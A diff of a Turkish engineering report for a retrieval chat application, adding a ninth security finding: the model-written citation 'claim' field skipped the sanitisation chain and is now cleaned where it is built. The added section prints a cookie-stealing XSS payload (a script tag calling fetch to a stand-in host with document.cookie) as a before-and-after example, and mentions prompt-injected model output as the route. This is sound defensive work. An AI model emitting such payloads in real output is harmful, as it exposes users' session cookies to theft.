@@ -198,9 +198,9 @@ yalnız yarısı: ikinci yarı **sürüm**.
 
 # R4 ŞERİT RAPORU — 9 Ağustos 2026
 
-Dal: `feat/answer-quality` · Worktree: `~/code/.dou-quality` · 8 commit
-Doğrulama: **577 test yeşil**, mypy temiz (62 dosya), ruff check + format temiz.
-Başlangıç 473'tü; 104 test eklendi.
+Dal: `feat/answer-quality` · Worktree: `~/code/.dou-quality` · 9 commit
+Doğrulama: **582 test yeşil**, mypy temiz (62 dosya), ruff check + format temiz.
+Başlangıç 473'tü; 109 test eklendi.
 
 Ölçüm korpusu: `dou_synapse_eval_e5` (8 belge / 33 chunk, `EMBEDDING_PROVIDER=fastembed`,
 `intfloat/multilingual-e5-large`, fastembed 0.8.0). Set: `evaluation/gold_set/calibration.json`.
@@ -219,6 +219,7 @@ Başlangıç 473'tü; 104 test eklendi.
 | EK — embedding sürüm damgası | **Şema + kapı hazır**, ingest yaması lider'de | 0006 + fail-closed kontrol |
 | **7 — önbellek zinciri atlıyordu** | **Bulundu ve kapatıldı**, yaması lider'de | EK B, uçtan uca ölçüldü |
 | **8 — şablon ipucu metadata'sı temizlenmiyordu** | **Bulundu ve tamamen kapatıldı** | EK C, yama gerekmiyor |
+| **9 — `claim` metni hiç denetlenmiyordu** | **Bulundu ve tamamen kapatıldı** | EK C, yama gerekmiyor |
 
 ---
 
@@ -506,7 +507,7 @@ görünür ve yalnız bazı belgeler hiç bulunmaz.
 ## 8. LİDERE — uygulanacak üç yama
 
 Üçü de **uygulandı, ölçüldü, sonra geri alındı**; commit'lerde bu iki dosya el
-değmemiş durumda. Üçü de dalın kendisinde 577 test yeşil, mypy temiz, ruff temiz
+değmemiş durumda. Üçü de dalın kendisinde 582 test yeşil, mypy temiz, ruff temiz
 iken doğrulandı.
 
 ### 8.1 `apps/api/app/api/chat.py` — `out_of_scope` üretimi
@@ -1064,7 +1065,7 @@ uygulanabilirler.
 
 ---
 
-## EK C — sekizinci açık: şablon ipucu, zincirin atladığı üçüncü yol
+## EK C — sekizinci ve dokuzuncu açık: zincirin atladığı iki yol daha
 
 EK B'yi yazarken "zincirin başka nerede atlandığını" aramak doğal oldu. Bir yer daha
 çıktı ve bu üçünün en kötüsü: **deterministik son durak.**
@@ -1114,18 +1115,55 @@ yapılacak her dönüşüm geçerli bir atfı uydurma saydırır.
 Yedi test bunu kilitliyor; meşru Türkçe dosya adlarının (`işletim-sistemleri-hafta3.pdf`)
 bozulmadığı ve başlık temizlikte boşalırsa alıntının konuma düştüğü dahil.
 
-### Aynı sınıftan üç açık — ortak ders
+
+### Dokuzuncu: `claim` — modelin yazdığı, kimsenin denetlemediği alan
+
+`citations[].claim` atıf kartında görünür ("bu kaynağın desteklediği iddia") ve
+**tamamen modelin ürettiği** tek metindir. Zincir ona hiç dokunmuyordu, çünkü
+`contracts.Citation`'a bilinçli olarak konmamıştı — gerekçe "hiçbir guardrail kararı
+ona bakmaz" idi ve o gerekçe doğru. Ama alanı sözleşmenin dışına çıkarmak, onu
+zincirin görüş alanının da dışına çıkardı.
+
+```
+model çıktısı → "claim": "<script>fetch('//x/'+document.cookie)</script> bu kaynak ..."
+
+ÖNCE →  zarf claim : '<script>fetch("//x/"+document.cookie)</script> bu kaynak sunu
+                      destekliyor — iletisim: a@dogus.edu.tr'
+SONRA → zarf claim : 'bu kaynak sunu destekliyor — iletisim: [REDACTED_EMAIL]'
+```
+
+Düzeltme `guardrails/citation.py:build_citations`'ta, yani alanın ÜRETİLDİĞİ yerde —
+zarfa, `chat_messages` kaydına ve sonraki geçmiş okumalarına giden üç yolu birden
+kapatıyor. Temizlikte tamamen boşalan bir iddia hiç taşınmıyor: zarfa boş bir alan
+koymak, koymamaktan kötü.
+
+Beş test bunu kilitliyor; meşru Türkçe iddianın ve `O(n log n)` gibi teknik gösterimin
+bozulmadığı, ve uçtan uca (model çıktısı → servis → zarf) doğrulama dahil.
+
+### Aynı sınıftan dört açık — ortak ders
 
 | nerede | zinciri neden atlıyordu | durum |
 |---|---|---|
-| atıf kartı | `GuardrailVerdict` yalnız metni taşıyor, atıflar kimsenin işi değildi | kapatıldı (§5) |
+| atıf kartı (`quote`/`file_name`/`location`) | `GuardrailVerdict` yalnız metni taşıyor, atıflar kimsenin işi değildi | kapatıldı (§5) |
 | önbellek isabeti | retrieval yapılmıyor, zincir hiç çağrılmıyordu | kapatıldı, yama §8.4 |
 | şablon ipucu | son durak, tanımı gereği zincirin dışında | kapatıldı (EK C) |
+| `claim` metni | sözleşmede yok, hiçbir karar ona bakmıyor — zincir varlığından habersiz | kapatıldı (EK C) |
 
-Üçünün ortak sebebi tek bir varsayım: **"metin zincirden geçti" ile "kullanıcının
-gördüğü her şey zincirden geçti" aynı şey sanılıyordu.** Kullanıcının gördüğü şey
-cevap metninden ibaret değil — atıf kartı, dosya adı, konum ve şablon metni de ekranda.
+Dördünün ortak sebebi tek bir varsayım: **"cevap metni zincirden geçti" ile
+"kullanıcının gördüğü her şey zincirden geçti" aynı şey sanılıyordu.** Kullanıcının
+gördüğü şey cevap metninden ibaret değil — atıf kartı, dosya adı, konum, şablon metni
+ve iddia cümlesi de ekranda.
 
-Öneri (lider/R5): bu üçü rapora **tek bir bulgu** olarak girmeli. Üç ayrı XSS düzeltmesi
-gibi anlatılırsa üç şanslı yakalama gibi okunur; oysa tek bir yanlış varsayımın üç
-tezahürü ve onu bulan şey mutasyon merceğiydi.
+Dördüncüsü (`claim`) en öğreticisi: alan sözleşmeye **bilinçli olarak konmamıştı**,
+gerekçesi "hiçbir guardrail kararı ona bakmaz" idi ve bu doğruydu. Ama "karar
+vermiyor" ile "denetlenmesi gerekmiyor" farklı şeyler; alan sözleşmenin dışına
+çıkarılırken zincirin görüş alanının da dışına çıktı. Modelin yazdığı `claim` alanına
+konan `<script>fetch('//x/'+document.cookie)</script>` zarfa olduğu gibi çıkıyordu —
+ve enjeksiyon savunmasının varlık sebebi tam olarak modelin materyaldeki talimata
+uyabilmesi.
+
+Öneri (lider/R5): bu dördü rapora **tek bir bulgu** olarak girmeli. Dört ayrı XSS
+düzeltmesi gibi anlatılırsa dört şanslı yakalama gibi okunur; oysa tek bir yanlış
+varsayımın dört tezahürü ve onu bulan şey mutasyon merceğiydi. Jüriye anlatılacak
+cümle şu: *ekrana çıkan her alanı sayıp her birinin hangi halkadan geçtiğini
+gösterebiliyor muyuz?*
